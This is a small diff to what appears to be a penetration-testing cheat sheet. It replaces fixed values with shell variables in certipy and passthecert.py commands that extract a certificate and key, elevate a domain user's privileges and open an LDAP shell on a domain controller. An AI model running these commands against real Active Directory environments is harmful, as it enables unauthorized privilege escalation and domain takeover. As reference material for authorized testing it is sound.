@@ -30,11 +30,11 @@ $ certipy cert -pfx user.pfx -nokey -out user.crt
 $ certipy cert -pfx user.pfx -nocert -out user.key
 
 # elevate a user (it assumes that the domain account for which the certificate was issued, holds privileges to elevate user)
-passthecert.py -action modify_user -crt user.crt -key user.key -domain domain.local -dc-ip "10.0.0.1" -target user_sam -elevate
+passthecert.py -action modify_user -crt "$CERT_FILE" -key "$KEY_FILE" -domain "$DOMAIN" -dc-ip "$DC_IP" -target "$USER" -elevate
 
 # spawn a LDAP shell
-passthecert.py -action ldap-shell -crt user.crt -key user.key -domain domain.local -dc-ip "10.0.0.1"
-certipy auth -pfx -dc-ip "10.0.0.1" -ldap-shell
+passthecert.py -action ldap-shell -crt "$CERT_FILE" -key "$KEY_FILE" -domain "$DOMAIN" -dc-ip "$DC_IP"
+certipy auth -pfx -dc-ip "$DC_IP" -ldap-shell
 ```
 
 
